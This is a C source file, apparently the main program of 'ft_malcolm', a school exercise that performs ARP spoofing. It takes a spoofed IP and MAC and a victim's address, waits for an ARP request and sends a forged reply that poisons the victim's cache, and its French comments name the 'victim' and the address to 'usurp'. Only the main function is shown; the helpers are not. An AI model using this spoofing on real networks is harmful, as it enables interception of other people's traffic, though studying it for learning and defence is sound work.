#include "ft_malcolm.h"

int g_sockfd = -1;

void handle_sigint(int sig)
{
    (void)sig;
    printf("\nExiting...\n");
    if (g_sockfd != -1)
        close(g_sockfd);
    exit(0);
}

int main(int ac, char **av)
{
	int verbose = 0;
	int arg_offset = 0;

    if (getuid() != 0)
    {
        printf("ft_malcolm: must be run as root\n");
        return 1;
    }

	if (ac == 6 && strcmp(av[1], "-v") == 0)
	{
		verbose = 1;
		arg_offset = 1;
	}
	else if (ac != 5)
	{
		printf("Usage: ./ft_malcolm [-v] <source_ip> <source_mac> <target_ip> <target_mac>\n");
		return 1;
	}

	struct sigaction sa;
	sa.sa_handler = handle_sigint;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	sigaction(SIGINT, &sa, NULL);

	char *source_ip  = av[1 + arg_offset]; // l'IP que tu vas usurper (IP_A)
	char *source_mac = av[2 + arg_offset]; // la fausse MAC que tu vas annoncer (MAC_toi)
	char *target_ip  = av[3 + arg_offset]; // la victime à empoisonner
	char *target_mac = av[4 + arg_offset]; // la vraie MAC de la victime

	// IPs : 4 octets
	uint8_t source_ip_converted[4];   // uint car un chiffre par octet. si avait fait tableau d int soit on aurait les 4 chiffre sur le meme octet (pas bon)  sooit 1 par 4 octet donc de la perte useless
	uint8_t target_ip_converted[4];  // uint permet d avoit 4 * 1 octet 
	
	// Pour les MACs : 6 octets
	uint8_t source_mac_converted[6];
	uint8_t target_mac_converted[6];

	if (!ip_getter(source_ip, source_ip_converted))
		return 1;
	if (!ip_getter(target_ip, target_ip_converted))
		return 1;
	if (!MAC_getter(source_mac, source_mac_converted))
		return 1;
	if (!MAC_getter(target_mac, target_mac_converted))
		return 1;

	g_sockfd = setup_socket();
	if (g_sockfd < 0)
		return 1;

	int ifindex = get_interface(g_sockfd);
	if (ifindex < 0)
		return 1;

	uint8_t buffer[42]; // taille exacte d'une trame ARP
	if (!receive_arp(g_sockfd, buffer, source_ip_converted))
		return 1;

	printf("got a valid ARP request, sending reply...\n");

	uint8_t reply[1024];
	build_reply(reply, target_mac_converted, source_mac_converted, source_ip_converted, target_ip_converted);

	if (!send_reply(g_sockfd, reply, target_mac_converted, ifindex))
		return 1;

	if (verbose)
	{
		struct arp_packet *arp = (struct arp_packet *)(buffer + 14);
		printf("[REQUEST] from IP:  %s\n", inet_ntoa(*(struct in_addr *)arp->src_ip));
		printf("[REQUEST] from MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
			arp->src_mac[0], arp->src_mac[1], arp->src_mac[2],
			arp->src_mac[3], arp->src_mac[4], arp->src_mac[5]);
		printf("[REPLY]   spoofing IP:  %s\n", source_ip);
		printf("[REPLY]   spoofing MAC: %s\n", source_mac);
		printf("[REPLY]   target IP:    %s\n", target_ip);
		printf("[REPLY]   target MAC:   %s\n", target_mac);
	}

	return 0;
}